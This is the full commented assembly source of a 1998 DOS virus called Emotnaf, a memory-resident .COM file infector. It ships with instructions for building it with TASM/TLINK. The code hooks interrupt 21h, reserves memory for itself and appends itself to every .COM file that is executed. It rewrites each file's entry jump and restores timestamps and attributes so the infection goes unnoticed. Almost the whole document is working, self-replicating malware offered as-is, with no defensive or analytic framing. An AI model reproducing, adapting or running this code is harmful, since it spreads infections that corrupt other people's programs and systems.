; ------------------------------------------------------------------------- ;
;         Emotnaf v1.1 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description: `-------------------| Started: 23/06/98 | Finished: 00/00/00 ;
;                                  `-------------------^------------------- ;
; v1.0 - Memory resident .com appender, infects upon execution  | Size: 000 ;
; v1.1 - Experiment with new ways to write this code...         `---------- ;
; v1.2 - restore time/date stamps and file attributes now                   ;
; v1.3 - makes sure it isnt a .exe renamed as a .com                        ;
; ------------------------------------------------------------------------- ;
; -> Dedicated to wicked music everywhere, like Rage Against The Machine <- ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm emotnaf.asm                                           ;
; to link :::::] tlink /t emotnaf.obj                                       ;
; ------------------------------------------------------------------------- ;

code    segment                                 ; name our segment 'code'
        assume  cs:code,ds:code                 ; assign CS and DS to code
        org     100h                            ; this be a .com file
        .286                                    ; needed for pusha/popa
        jumps                                   ; save space wasted jumping

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;

blank:  db      0e9h,0,0                        ; jump to start of code
start:  call    delta                           ; push IP on to stack
delta:  pop     bp                              ; pop it into bp
        sub     bp,offset delta                 ; get the delta offset

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;

        mov     ax,0deadh                       ; check if already resident
        int     21h                             ; if we are, bx = 0deadh now
        cmp     bx,0deadh                       ; does bx hold 0deadh ?
        je      first3                          ; we are already resident!

        sub     word ptr cs:[2],80h             ; lower top of PSP mem data
        mov     ax,cs                           ; move CS into AX
        dec     ax                              ; decrement AX
        mov     ds,ax                           ; move AX into DS
        sub     word ptr ds:[3],80h             ; sub 2kb from accessed MCB
        xor     ax,ax                           ; xor the value in ax to 0
        mov     ds,ax                           ; move that value into DS
        sub     word ptr ds:[413h],2            ; adjust BIOS data by 2kb
        mov     ax,word ptr ds:[413h]           ; move adjusted BIOS data
        mov     cl,6                            ; load cl with value of 6
        shl     ax,cl                           ; multiply BIOS mem by 64
        mov     es,ax                           ; move value into ES
        push    cs                              ; push value of code segment
        pop     ds                              ; into data segment register
        xor     di,di                           ; xor value in DI to 0
        lea     si,[bp+start]                   ; load the source index
        mov     cx,finished-start               ; # of bytes to load up
        rep     movsb                           ; load virus into memory

        xor     ax,ax                           ; value in ax to 0
        mov     ds,ax                           ; move value into DS
        lea     ax,new21                        ; point IVT to new ISR
        sub     ax,offset start                 ; subtract start offset
        mov     bx,es                           ; move es into bx

        cli                                          ; interrupts off
        xchg    ax,word ptr ds:[84h]                 ; switch old/new int 21h
        xchg    bx,word ptr ds:[86h]                 ; switch old/new int 21h
        mov     word ptr es:[oi21-offset start],ax   ; save the old int 21h
        mov     word ptr es:[oi21+2-offset start],bx ; save the old int 21h
        sti                                          ; interrupts on

        push    cs cs                           ; push code segment twice
        pop     ds es                           ; into DS and ES registers

first3: lea     si,[bp+saved]                   ; load up the source index
        mov     di,100h                         ; load the destination index
        push    di                              ; push 100h on to the stack
        movsw                                   ; move two bytes now
        movsb                                   ; move one byte now
        retn                                    ; return control to host

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;

new21:  pushf                                   ; push all flags
        pusha                                   ; push all registers
        push    ds                              ; push data segment register
        push    es                              ; push extra segment register
        push    bp                              ; save the delta offset

        cmp     ax,0deadh                       ; are we testing if resident?
        je      rezchk                          ; yes, show them we are rez

        cmp     ah,4bh                          ; something being executed?
        je      infect                          ; yes, infect the file

exit:   pop     bp                              ; restore the delta offset
        pop     es                              ; pop ES from the stack
        pop     ds                              ; pop DS from the stack
        popa                                    ; pop all registers
        popf                                    ; pop all flags
        db      0eah                            ; jump to original ISR
        oi21    dd ?                            ; old int 21 goes here

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;

rezchk: mov     bx,0deadh                       ; move check value into bx
        jmp     exit                            ; and go to original int 21h

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;

infect: call    tsrdel                          ; push IP on to stack again
tsrdel: pop     bp                              ; pop it into bp
        sub     bp,offset tsrdel                ; get the 2nd delta offset

        push    ds                              ; push DS on to stack
        pop     es                              ; pop it into es
        mov     di,dx                           ; move file handle into di
        mov     cx,64                           ; 64 byte filename possible
        mov     al,'.'                          ; load al with the .
        cld                                     ; clear direction flag
        repnz   scasb                           ; scan until . is hit
        cmp     word ptr ds:[di],'OC'           ; is the file .CO- ?
        jne     abort                           ; not it isn't, abort
        cmp     byte ptr ds:[di+2],'M'          ; is the file .--M ?
        jne     abort                           ; no it isn't, abort

        mov     ax,4300h                        ; get file attributes
        int     21h                             ; attributes in cx now
        push    cx                              ; save the attributes
        push    dx                              ; save the file handle

        mov     ax,4301h                        ; set file attributes
        xor     cx,cx                           ; to none at all
        int     21h                             ; ready to open up now

        mov     ax,3d02h                        ; open the file read/write
        int     21h                             ; open the file now
        xchg    bx,ax                           ; move the file handle

        push    cs cs                           ; push CS on to stack twice
        pop     ds es                           ; pop it into DS and ES

        mov     ax,5700h                        ; get time / date stamps
        int     21h                             ; time in cx, date in dx
        push    cx                              ; save the time
        push    dx                              ; save the date

        mov     ah,3fh                          ; the read function
        lea     dx,[bp+saved]                   ; read the bytes to here
        mov     cx,3                            ; read first three bytes
        int     21h                             ; first three recorded

        cmp     word ptr [bp+saved],'ZM'        ; check if renamed .exe
        je      close                           ; shit, this be a .exe!
        cmp     word ptr [bp+saved],'MZ'        ; check if renamed .exe
        je      close                           ; shit, this be a .exe!

        mov     ax,4202h                        ; scan to end of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; DX:AX = file size now!

        cmp     dx,0                            ; is the file < 65,535 bytes?
        jne     close                           ; way to big, close it up
        mov     cx,word ptr [bp+saved+1]        ; move saved+1 into cx
        add     cx,finished-start+3             ; virus size + jump
        cmp     ax,cx                           ; compare the two
        jz      close                           ; if equal, close it up

        sub     ax,3                            ; get jump to virus body size
        mov     word ptr [bp+newjump+1],ax      ; write as our new jump

        mov     ax,4200h                        ; point to start of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; pointing to SOF

        mov     ah,40h                          ; write to file
        lea     dx,[bp+newjump]                 ; write the jump
        mov     cx,3                            ; write three bytes
        int     21h                             ; jump is written

        mov     ax,4202h                        ; point to end of file
        xor     cx,cx                           ; xor value of cx to 0
        cwd                                     ; likewize for dx
        int     21h                             ; pointing to EOF

        mov     ah,40h                          ; write to file
        lea     dx,[bp+start]                   ; from the start of virus
        mov     cx,finished-start               ; # of bytes to write
        int     21h                             ; write them now

close:  mov     ax,5701h                        ; set time / date stamps
        pop     dx                              ; restore the date
        pop     cx                              ; restore the time
        int     21h                             ; time / date restored

        mov     ah,3eh                          ; close up the file
        int     21h                             ; file is closed

        mov     ax,4301h                        ; set file attributes
        pop     dx                              ; restore the file handle
        pop     cx                              ; restore the attributes
        int     21h                             ; attributes restored

abort:  jmp     exit                            ; point to original ISR

;%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%;

        saved   db 0cdh,20h,0                   ; our saved bytes
        newjump db 0e9h,0,0                     ; the soon to be jump
        finished:                               ; end of the virus
        code    ends                            ; end code segment
        end     blank                           ; end / where to start

; ------------------------------------------------------------------------- ;
; --> Angels Are Just Assassins Of God, One Wing Always Dipped In Blood <-- ;
; ------------------------------------------------------------------------- ;
